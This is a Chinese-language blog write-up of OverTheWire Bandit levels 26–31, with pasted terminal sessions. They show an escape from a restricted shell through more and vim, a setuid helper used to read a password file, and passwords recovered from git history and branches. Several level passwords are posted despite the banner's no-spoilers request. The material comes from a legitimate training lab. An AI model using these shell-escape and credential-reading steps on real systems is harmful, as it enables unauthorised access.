POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to localhost closed. bandit25@bandit:~$bandit25@bandit:~$cat /etc/passwd root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt❌100:65534::/nonexistent:/bin/false messagebus❌101:104::/var/run/dbus:/bin/false sshd❌102:65534::/run/sshd:/usr/sbin/nologin identd❌103:65534::/var/run/identd:/bin/false ntp❌104:107::/home/ntp:/bin/false bandit0❌11000:11000:bandit level 0:/home/bandit0:/bin/bash bandit1❌11001:11001:bandit level 1:/home/bandit1:/bin/bash bandit10❌11010:11010:bandit level 10:/home/bandit10:/bin/bash bandit11❌11011:11011:bandit level 11:/home/bandit11:/bin/bash bandit12❌11012:11012:bandit level 12:/home/bandit12:/bin/bash bandit13❌11013:11013:bandit level 13:/home/bandit13:/bin/bash bandit14❌11014:11014:bandit level 14:/home/bandit14:/bin/bash bandit15❌11015:11015:bandit level 15:/home/bandit15:/bin/bash bandit16❌11016:11016:bandit level 16:/home/bandit16:/bin/bash bandit17❌11017:11017:bandit level 17:/home/bandit17:/bin/bash bandit18❌11018:11018:bandit level 18:/home/bandit18:/bin/bash bandit19❌11019:11019:bandit level 19:/home/bandit19:/bin/bash bandit2❌11002:11002:bandit level 2:/home/bandit2:/bin/bash bandit20❌11020:11020:bandit level 20:/home/bandit20:/bin/bash bandit21❌11021:11021:bandit level 21:/home/bandit21:/bin/bash bandit22❌11022:11022:bandit level 22:/home/bandit22:/bin/bash bandit23❌11023:11023:bandit level 23:/home/bandit23:/bin/bash bandit24❌11024:11024:bandit level 24:/home/bandit24:/bin/bash bandit25❌11025:11025:bandit level 25:/home/bandit25:/bin/bash bandit26❌11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit27❌11027:11027:bandit level 27:/home/bandit27:/bin/bash bandit28❌11028:11028:bandit level 28:/home/bandit28:/bin/bash bandit29❌11029:11029:bandit level 29:/home/bandit29:/bin/bash bandit3❌11003:11003:bandit level 3:/home/bandit3:/bin/bash bandit30❌11030:11030:bandit level 30:/home/bandit30:/bin/bash bandit31❌11031:11031:bandit level 31:/home/bandit31:/bin/bash bandit32❌11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershell bandit33❌11033:11033:bandit level 33:/home/bandit33:/bin/bash bandit4❌11004:11004:bandit level 4:/home/bandit4:/bin/bash bandit5❌11005:11005:bandit level 5:/home/bandit5:/bin/bash bandit6❌11006:11006:bandit level 6:/home/bandit6:/bin/bash bandit7❌11007:11007:bandit level 7:/home/bandit7:/bin/bash bandit8❌11008:11008:bandit level 8:/home/bandit8:/bin/bash bandit9❌11009:11009:bandit level 9:/home/bandit9:/bin/bash bandit27-git❌11527:11527::/home/bandit27-git:/usr/bin/git-shell bandit28-git❌11528:11528::/home/bandit28-git:/usr/bin/git-shell bandit29-git❌11529:11529::/home/bandit29-git:/usr/bin/git-shell bandit30-git❌11530:11530::/home/bandit30-git:/usr/bin/git-shell bandit31-git❌11531:11531::/home/bandit31-git:/usr/bin/git-shell   ls有一个ssh私钥连上去之后，连接被关闭了\n根据题目提示我们去看/etc/passwd\n https://blog.csdn.net/yexiangCSDN/article/details/89963698\nhttps://blog.csdn.net/zyy1659949090/article/details/88176215\n/etc/passwd这文件里存放里用户相关信息，包括指定登录shell\n大概格式为： 用户名:口令:用户标识号uid:组标识号gid:注释性描述:主目录:指定登录shell\n 看到26关这一行是一个showtext\nbandit26❌11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext cat查看发现是设置中断类型为linux\n1 2 3 4 5 6 7 8  bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux more ~/text.txt exit 0 bandit25@bandit:~$    tips：\nmore，less，vim的退出来的那个都是可以执行命令的\n 因为这里是more，所以我们把终端缩小\n然后我就卡住了，因为执行的命令都没有回显\n最后看别人的攻略，发现是在more的模式下按v，进入vim模式\n在vim模式下，用:e /etc/bandit_pass/bandit26导入密码文件，得到如下一行\n5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z 长见识了长见识了\n这简直就是个骚操作\n// 在ans.txt中\n level 27 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96  bl@bl-virtual-machine:~/wargame$ ssh bandit26@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit26@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to bandit.labs.overthewire.org closed.   用上一关的flag进入这一关，发现连接又被断开了\n推测方法跟上一关一样，进入more模式，利用vim模式执行命令\n但是这次并不能用:e来读取文件，一i那位权限不够，!command也无法执行\n后来查资料发现vim还可以通过设置shell的目录来执行shell的方式\n1 2 3  # vim模式下 :set shell=/bin/sh :sh   这样就得到了一个shell，ls发现有一个./bandit27-do程序，推测和以前一样，是要给setuid的程序，尝试一下果然没错，直接用此读取密码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123  bl@bl-virtual-machine:~/wargame$ ssh bandit26@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit26@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / !vim _ _ _ _ ___ __ | | | (_) | |__ \\ / / !v _ _ _ _ ___ __ | | | (_) | |__ \\ / / :!ls _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ :!ls _ _ _ _ ___ __ | | | (_) | |__ \\ / / :sh $ls bandit27-do text.txt $cat text.txt _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ $./bandit27-do Run a command as another user. Example: ./bandit27-do id $./bandit27-do id uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26) $./bandit27-do cat /etc/bandit_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea   level 28 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125  bl@bl-virtual-machine:~/wargame$ ssh bandit27@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! bandit27@bandit:~$git clone ssh://bandit27-git@localhost/home/bandit27-git/repofatal: could not create work tree dir 'repo': Permission denied bandit27@bandit:~$git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo fatal: could not create work tree dir 'repo': Permission denied bandit27@bandit:~$cd /tmp bandit27@bandit:/tmp$mkdir b27r bandit27@bandit:/tmp$cd b27r bandit27@bandit:/tmp/b27r$git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo Cloning into 'repo'... ssh: connect to host localhost port 2220: Connection refused fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. bandit27@bandit:/tmp/b27r$git clone ssh://bandit27-git@localhost/home/bandit27-git/repo Cloning into 'repo'... Could not create directory '/home/bandit27/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27-git@localhost's password: remote: Counting objects: 3, done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0) Receiving objects: 100% (3/3), done. bandit27@bandit:/tmp/b27r$ls repo bandit27@bandit:/tmp/b27r$cd repo bandit27@bandit:/tmp/b27r/repo$ls README bandit27@bandit:/tmp/b27r/repo$bandit27@bandit:/tmp/b27r/repo$cat README The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2 bandit27@bandit:/tmp/b27r/repo$  由题目知道git的密码和本关flag一样\n很简单的一个git的用法，git支持ssh协议这在之前就已经知道了\n所以直接进入bandit27去clone仓库\n结果没有权限，以为是端口错了，结果是忘了我们对bandit27的home目录没有读写权限\n老办法，去tmp创一个新目录，然后clone，果然成功，flag在repo里的README里\nlevel 29 无意的发现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  bandit12@bandit:~$ ls data.txt bandit12@bandit:~$ ls /tmp/fuck repo bandit12@bandit:~$ ls /tmp/fuck/repo README.md bandit12@bandit:~$ ls /tmp/fuck/repo/README.md /tmp/fuck/repo/README.md bandit12@bandit:~$ cat /tmp/fuck/repo/README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: bbc96594b4e001778eee9975372716b2   原来是碰巧有人在/tmp/fuck创建了这个git仓库，同道中人啊\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120  bl@bl-virtual-machine:~/wargame$ ssh bandit28@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! Enjoy your stay! bandit28@bandit:~$ls bandit28@bandit:~$mkdir /tmp/b28r bandit28@bandit:~$cd /tmp/b28r bandit28@bandit:/tmp/b28r$ls bandit28@bandit:/tmp/b28r$git clone ssh://bandit28-git@localhost/home/bandit28-git/repo Cloning into 'repo'... Could not create directory '/home/bandit28/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28-git@localhost's password: remote: Counting objects: 9, done. remote: Compressing objects: 100% (6/6), done. remote: Total 9 (delta 2), reused 0 (delta 0) Receiving objects: 100% (9/9), done. Resolving deltas: 100% (2/2), done. bandit28@bandit:/tmp/b28r$ls repo bandit28@bandit:/tmp/b28r$cd repo bandit28@bandit:/tmp/b28r/repo$ls README.md bandit28@bandit:/tmp/b28r/repo$cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx bandit28@bandit:/tmp/b28r/repo$ls -al total 16 drwxr-sr-x 3 bandit28 root 4096 Feb 26 04:12 . drwxr-sr-x 3 bandit28 root 4096 Feb 26 04:12 .. drwxr-sr-x 8 bandit28 root 4096 Feb 26 04:12 .git -rw-r--r-- 1 bandit28 root 111 Feb 26 04:12 README.md bandit28@bandit:/tmp/b28r/repo$ls .git branches description hooks info objects refs config HEAD index logs packed-refs bandit28@bandit:/tmp/b28r/repo$ls .git/branches/ bandit28@bandit:/tmp/b28r/repo$cat .git/HEAD ref: refs/heads/master bandit28@bandit:/tmp/b28r/repo$git log commit 073c27c130e6ee407e12faad1dd3848a110c4f95 Author: Morla Porla \u003cmorla@overthewire.org\u003e Date: Tue Oct 16 14:00:39 2018 +0200 fix info leak commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb Author: Morla Porla \u003cmorla@overthewire.org\u003e Date: Tue Oct 16 14:00:39 2018 +0200 add missing data commit b67405defc6ef44210c53345fc953e6a21338cc7 Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:39 2018 +0200 initial commit of README.md bandit28@bandit:/tmp/b28r/repo$git revert 186a1038cc54d1358d42d468cdc8e3cc28a93fcb error: could not revert 186a103... add missing data hint: after resolving the conflicts, mark the corrected paths hint: with 'git add \u003cpaths\u003e' or 'git rm \u003cpaths\u003e' hint: and commit the result with 'git commit' bandit28@bandit:/tmp/b28r/repo$git reset --hard 186a1038cc54d1358d42d468cdc8e3cc28a93fcb HEAD is now at 186a103 add missing data bandit28@bandit:/tmp/b28r/repo$ls README.md bandit28@bandit:/tmp/b28r/repo$cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: bbc96594b4e001778eee9975372716b2 bandit28@bandit:/tmp/b28r/repo$git reset --hard b67405defc6ef44210c53345fc953e6a21338cc7 HEAD is now at b67405d initial commit of README.md bandit28@bandit:/tmp/b28r/repo$cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: \u003cTBD\u003e bandit28@bandit:/tmp/b28r/repo$  老办法，直接tmp目录创建新目录，然后clone\n发现README里明显有一个假flagxxxxxx，其他也没啥东西可推测的，题目也就只有一个git的提示，我们便想到git的分支和回滚，查看branch发现没有其他分支，git log发现有以前的提交，利用命令git reset --hard \u003ccommit_id\u003e回滚到对应版本，然后cat README.md得到flag：bbc96594b4e001778eee9975372716b2\n 还可以用git show 查看版本差别\n level 30 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115  Enjoy your stay! bandit29@bandit:~$ mkdir /tmp/b29r bandit29@bandit:~$ cd /tmp/b29r bandit29@bandit:/tmp/b29r$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo Cloning into 'repo'... Could not create directory '/home/bandit29/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit29-git@localhost's password: remote: Counting objects: 16, done. remote: Compressing objects: 100% (11/11), done. remote: Total 16 (delta 2), reused 0 (delta 0) Receiving objects: 100% (16/16), done. Resolving deltas: 100% (2/2), done. bandit29@bandit:/tmp/b29r$ ls repo bandit29@bandit:/tmp/b29r$ cd repo bandit29@bandit:/tmp/b29r/repo$ ls README.md bandit29@bandit:/tmp/b29r/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u003cno passwords in production!\u003e bandit29@bandit:/tmp/b29r/repo$ git log commit 84abedc104bbc0c65cb9eb74eb1d3057753e70f8 Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:41 2018 +0200 fix username commit 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650 Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:41 2018 +0200 initial commit of README.md bandit29@bandit:/tmp/b29r/repo$ ls .git/branches/ bandit29@bandit:/tmp/b29r/repo$ ls .git branches description hooks info objects refs config HEAD index logs packed-refs bandit29@bandit:/tmp/b29r/repo$ cat .git/config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = ssh://bandit29-git@localhost/home/bandit29-git/repo fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master bandit29@bandit:/tmp/b29r/repo$ git reset --hard 84abedc104bbc0c65cb9eb74eb1d3057753e70f8 HEAD is now at 84abedc fix username bandit29@bandit:/tmp/b29r/repo$ ls README.md bandit29@bandit:/tmp/b29r/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u003cno passwords in production!\u003e bandit29@bandit:/tmp/b29r/repo$ bandit29@bandit:/tmp/b29r/repo$ cat .git/HEAD ref: refs/heads/master bandit29@bandit:/tmp/b29r/repo$ git branch * master bandit29@bandit:/tmp/b29r/repo$ git branch -a * master remotes/origin/HEAD -\u003e origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev bandit29@bandit:/tmp/b29r/repo$ git checkout origin/dev Note: checking out 'origin/dev'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b \u003cnew-branch-name\u003e HEAD is now at 33ce2e9... add data needed for development bandit29@bandit:/tmp/b29r/repo$ ls code README.md bandit29@bandit:/tmp/b29r/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: 5b90576bedb2cc04c86a9e924ce42faf bandit29@bandit:/tmp/b29r/repo$ ls code gif2ascii.py bandit29@bandit:/tmp/b29r/repo$ cat code/gif2ascii.py bandit29@bandit:/tmp/b29r/repo$   git log发现就只有两次提交，cat README发现说密码不在production\n https://www.cnblogs.com/jiangzhaowei/p/7879916.html\n 这里果然出现了中英的差别，百度才得知production就是我们通常所说的master分支，上文中可以看到git开发中常见的几个分支dev，master，release等\n直接git branch -a 查看所有分支，切换到dev分支，便得到了flag：5b90576bedb2cc04c86a9e924ce42faf\nlevel 31 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  bandit30@bandit:~$ mkdir /tmp/b30r bandit30@bandit:~$ cd /tmp/b30r bandit30@bandit:/tmp/b30r$ ls bandit30@bandit:/tmp/b30r$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo Cloning into 'repo'... Could not create directory '/home/bandit30/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit30-git@localhost's password: remote: Counting objects: 4, done. remote: Total 4 (delta 0), reused 0 (delta 0) Receiving objects: 100% (4/4), done. bandit30@bandit:/tmp/b30r$ cd repo bandit30@bandit:/tmp/b30r/repo$ ls README.md bandit30@bandit:/tmp/b30r/repo$ cat README.md just an epmty file... muahaha bandit30@bandit:/tmp/b30r/repo$ git log commit 3aa4c239f729b07deb99a52f125893e162daac9e Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:44 2018 +0200 initial commit of README.md bandit30@bandit:/tmp/b30r/repo$ cat .git/config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = 